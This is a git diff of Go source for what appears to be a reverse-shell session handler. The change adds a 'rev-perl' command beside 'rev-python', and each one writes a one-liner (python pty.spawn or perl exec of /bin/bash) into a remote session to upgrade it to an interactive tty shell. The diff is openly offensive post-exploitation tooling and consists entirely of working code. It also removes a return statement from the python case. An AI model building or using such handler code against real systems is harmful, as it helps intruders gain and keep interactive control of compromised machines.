@@ -276,22 +276,27 @@ func (s *Socket) status() string {
 
 func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.Writer) bool{
 	pythonttyCommand := "rev-python"
+	perlttyCommand  := "rev-perl"
 	
 	switch command {
 	case sessionHelpCommand:
 		fmt.Println("<-------------------------------------------------")
 		fmt.Println(backgroundCommand,"- Background the session")
-		fmt.Println(pythonttyCommand,"- Try to start tty shell in python (Linux)")
+		fmt.Println(pythonttyCommand,"- Spawn tty bash shell using python (Linux)")
+		fmt.Println(perlttyCommand,"- Spawn to start tty bash shell using perl (Linux)")
 		fmt.Println("------------------------------------------------->")
 		return true
 	case backgroundCommand:
 		s.isBackground = true
 		return true
 	case pythonttyCommand:
-		fmt.Println("[+] Try Python 3 command ...")
+		fmt.Println("[+] Try Python 3 tty command ...")
 		dst.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")';\\n"))
-		fmt.Println("[+] Try Python 2 command ...")
+		fmt.Println("[+] Try Python 2 tty command ...")
 		dst.Write([]byte("python -c 'import pty;pty.spawn(\"/bin/bash\")';\\n"))
+	case perlttyCommand:
+		fmt.Println("[+] Try Perl tty command ...")
+		dst.Write([]byte("perl -e 'exec \"/bin/bash\";'\\n"))
 		return true
 	}
 
